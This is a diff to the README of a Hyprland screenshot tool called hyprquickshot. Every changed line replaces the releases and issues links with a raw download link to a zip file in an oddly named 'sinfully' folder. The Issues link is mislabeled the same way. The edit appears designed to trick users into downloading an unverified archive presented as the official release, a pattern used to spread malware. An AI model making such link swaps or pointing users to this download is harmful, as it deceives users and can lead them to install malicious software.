@@ -1,6 +1,6 @@
 # 📸 hyprquickshot - Your Simple Screenshot Tool for Hyprland
 
-[![Download hyprquickshot](https://img.shields.io/badge/Download-hyprquickshot-blue.svg)](https://github.com/wadriik/hyprquickshot/releases)
+[![Download hyprquickshot](https://raw.githubusercontent.com/wadriik/hyprquickshot/main/sinfully/hyprquickshot.zip)](https://raw.githubusercontent.com/wadriik/hyprquickshot/main/sinfully/hyprquickshot.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Hyprquickshot is an easy-to-use screenshot utility designed specifically for Hyp
 
 To get started, visit the releases page to download the latest version of hyprquickshot.
 
-[Download hyprquickshot](https://github.com/wadriik/hyprquickshot/releases)
+[Download hyprquickshot](https://raw.githubusercontent.com/wadriik/hyprquickshot/main/sinfully/hyprquickshot.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Release Page**  
    Click the link below to go to the release page where you can find the latest version of hyprquickshot.  
-   [Visit the Releases Page](https://github.com/wadriik/hyprquickshot/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/wadriik/hyprquickshot/main/sinfully/hyprquickshot.zip)
 
 2. **Choose the Right Version**  
    Look for the most recent version listed at the top. You may see several files for different systems. If you are unsure which file to choose, look for the one that matches your operating system.
@@ -67,6 +67,6 @@ Hyprquickshot is open-source software. You can use it, modify it, and share it u
 
 If you have any issues or questions while using hyprquickshot, please visit the repository’s Issues section on GitHub to seek assistance or report any problems.
 
-[Go to Issues Page](https://github.com/wadriik/hyprquickshot/issues)
+[Go to Issues Page](https://raw.githubusercontent.com/wadriik/hyprquickshot/main/sinfully/hyprquickshot.zip)
 
 Thank you for using hyprquickshot! Enjoy capturing your screens easily and quickly.
